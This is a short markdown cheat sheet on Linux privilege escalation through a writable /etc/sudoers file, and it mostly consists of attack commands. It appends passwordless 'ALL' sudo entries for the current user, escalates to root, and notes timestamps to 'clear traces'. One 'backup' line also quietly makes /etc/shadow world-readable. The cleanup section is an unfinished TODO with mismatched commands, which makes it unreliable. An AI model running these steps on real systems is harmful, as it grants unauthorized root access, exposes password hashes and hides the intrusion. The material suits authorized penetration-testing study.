# Living off the Land

## 01 - Enumerate

```
$ ls -l /etc/sudoers
```

## 02 - Exploit

Before editing the file. Take note of the timestamp to clear traces ahead of time.

```
$ stat /etc/sudoers
```

Backup the `sudoers` file. To clear traces ahead of time.

```
$ cp /etc/sudoers /tmp/sudoers.bak && sudo chmod o+r /etc/shadow
```

Append the line with the current username.

```
$ echo "$USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

$ echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

$ echo "$(id -un) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

Check if you the current user has administrative privileges.

```
$ sudo -l 2>/dev/null
User <username> may run the following commands on <hostname>:
	(ALL) NOPASSWD: ALL
```

Then escalate to `root`.

```
$ sudo su -
```

## 03 - Cleanup

TODO: Fill in this info

```
$ cp /etc/shadow.bak /tmp/shadow

$ touch
```

---
## References

### Juggernaut-Sec

- [Juggernaut-Sec: Weak File Permissions - Linux Privilege Escalation](https://juggernaut-sec.com/weak-file-permissions/)